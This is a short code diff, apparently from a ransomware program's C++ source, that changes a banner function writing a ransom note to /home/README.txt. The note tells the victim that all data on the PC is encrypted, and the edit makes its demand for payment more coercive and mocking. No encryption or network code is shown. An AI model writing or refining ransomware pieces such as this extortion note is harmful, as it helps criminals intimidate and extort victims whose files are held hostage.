@@ -55,7 +55,7 @@ void banner(){
     bannerfile.open("/home/README.txt");
     bannerfile << "Hello Sir..."\
         "All data in your PC is encrypted!!!!!!!!!!!!!!!\n"\
-        "you will be send to me a ransom\nHAHAHAHAHA you are a crazy man :D\n";
+        "BLAME YOURSELF AND OBEY: you must send a ransom to me\nHAHAHAHAHA you are a crazy man :D\n";
     bannerfile.close();
 
 
